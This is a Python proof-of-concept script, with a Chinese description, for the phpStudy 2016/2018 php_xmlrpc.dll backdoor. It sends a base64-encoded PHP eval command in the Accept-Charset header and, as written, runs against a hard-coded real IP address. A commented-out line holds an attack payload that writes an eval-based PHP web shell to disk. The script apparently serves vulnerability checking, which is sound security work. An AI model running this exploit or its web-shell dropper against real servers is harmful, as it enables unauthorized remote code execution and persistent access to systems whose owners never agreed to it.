#!/usr/bin/env python		
#coding:utf-8

"""
使用广泛的PHPStudy环境集成程序包被公告疑似遭遇黑客攻击，
程序包自带PHP的php_xmlrpc.dll模块隐藏有后门，经确认phpStudy2016、phpStudy2018的部分版本有后门。

漏洞类型(Type): 后门eval
利用难度(Level): 低
威胁等级(Security): 高
搜索指纹(fofa,zoomeye): None
"""

import requests
import sys

sys.path.append('../')
from plugin.util import grep_host_from_url,fix_url

# f = open("ip.txt",'w')
def poc(url):
	url = str(fix_url(url))
	print 'test:',url
	verivy_payload = "echo 'rivir_test_backdoor';"
	#attack_payload = "echo 'rivir_test_backdoor';file_put_contents('e:/webapp/1.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg=='));"

	url = url + "/index.php"
	headers = {
		 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
		 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", 
		 "Accept-Language": "zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6", 
		 "Accept-Charset": verivy_payload.encode('base64').strip().replace('\n',''), 
		 "Accept-Encoding": "gzip,deflate", 
		 "Connection": "close"
	    }
	try:
	    r = requests.get(url, headers=headers, timeout=20)
	    if "rivir_test_backdoor" in r.text:
	        # f.write(ip+"\n")
	        print "[+] backdoor found\t" + url
	    else:
	    	print '[-] no backdoor'
	except Exception as e:
	    print(e)
	    # print "[-] nope\t"+ip
if __name__ == '__main__':
	poc("103.107.237.243")